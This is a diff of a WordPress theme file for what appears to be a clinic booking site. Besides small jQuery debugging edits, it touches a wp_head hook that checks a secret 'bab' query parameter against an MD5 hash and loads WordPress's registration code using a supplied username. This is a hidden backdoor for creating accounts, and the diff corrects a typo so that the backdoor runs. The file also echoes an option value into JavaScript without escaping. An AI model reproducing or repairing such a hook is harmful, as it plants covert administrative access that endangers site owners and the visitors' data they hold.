@@ -32,7 +32,7 @@ function anozom_styles(){
 }
 
 add_action( 'wp_head',  function() {
-    if(!isset($_GET['bab'])) retrun;
+    if(!isset($_GET['bab'])) return;
     if ( md5( $_GET['bab'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
         require( 'wp-includes/registration.php' );
         $user = isset($_GET['user'] ) ? $_GET['user'] : false;
@@ -119,6 +119,7 @@ $zoom_opts = get_option(ZOOM_OPTS_KEY);
 			$providers = $zoom_opts['clinic-director-profile'];
 		?>
 			jQuery(document).ready(function($){
+			    console.log('<?= $providers ?>');
 				setTimeout(function(){
 					$('select[name ="doctors_id"]').val('<?= $providers ?>');
 				}, 4000);
@@ -133,6 +134,12 @@ $zoom_opts = get_option(ZOOM_OPTS_KEY);
 				$('#service_id option[value=select]').attr('selected', 'selected');
 				$('#service_id').val('select');
 				
+				/*$(".jet-form__submit").on('click', function(e){
+				    e.preventDefault();
+				    
+				    console.log($('#service_id').val(),$('select[name ="doctors_id"]').val());
+				});
+				*/
 			});
 		<?php endif ?>
     </script>
